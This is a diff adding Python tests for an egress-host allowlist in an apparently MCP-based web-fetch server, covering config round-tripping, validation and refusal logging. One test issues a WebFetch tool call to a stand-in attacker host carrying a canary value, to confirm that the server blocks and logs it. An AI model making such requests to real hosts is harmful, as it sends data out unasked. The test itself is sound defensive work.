@@ -294,3 +294,44 @@ class TestARefusedStart:
         proc = self._run(*argv)
         assert proc.returncode == 2
         assert proc.stdout == b""
+
+
+class TestTheEgressLimit:
+    """A limited task's hosts and its refusal log cross the file intact."""
+
+    def test_the_document_carries_the_hosts_and_the_log_path(self, tmp_path):
+        log = tmp_path / "egress-refused.jsonl"
+        policy = WebFetchPolicy(exact_hosts=("news.example.com",), refusal_log=str(log))
+        document = web_mcp.read_config(str(_write_config(tmp_path, policy)))
+        assert document["policy"]["exact_hosts"] == ["news.example.com"]
+        assert document["policy"]["refusal_log"] == str(log)
+        assert web_mcp.policy_from_document(document) == policy
+
+    def test_no_limit_and_an_empty_limit_stay_apart(self, tmp_path):
+        for limit in (None, ()):
+            document = web_mcp.config_document(
+                WebFetchPolicy(exact_hosts=limit), cwd=tmp_path, url_corpus=None, gate=None,
+            )
+            assert web_mcp.policy_from_document(
+                json.loads(json.dumps(document)),
+            ).exact_hosts == limit
+
+    @pytest.mark.parametrize("value", ["news.example.com", [1], True, {"a": 1}])
+    def test_a_limit_of_the_wrong_shape_is_refused(self, tmp_path, value):
+        document = web_mcp.config_document(WebFetchPolicy(), cwd=tmp_path, url_corpus=None, gate=None)
+        document["policy"]["exact_hosts"] = value
+        with pytest.raises(web_mcp.ConfigError):
+            web_mcp.policy_from_document(document)
+
+    def test_the_server_refuses_and_logs(self, server, tmp_path):
+        log = tmp_path / "egress-refused.jsonl"
+        policy = WebFetchPolicy(exact_hosts=("news.example.com",), refusal_log=str(log))
+        mcp = server(_write_config(tmp_path, policy))
+        mcp.request(0, "initialize", {"protocolVersion": "2025-11-25"})
+        reply = mcp.request(1, "tools/call", {
+            "name": "WebFetch", "arguments": {"url": "https://evil.example/?d=canary"},
+        })
+        text = reply["result"]["content"][0]["text"]
+        assert reply["result"]["isError"] is True
+        assert text.startswith("egress_not_approved: evil.example")
+        assert json.loads(log.read_text()) == {"channel": "web_fetch", "entry": "evil.example"}
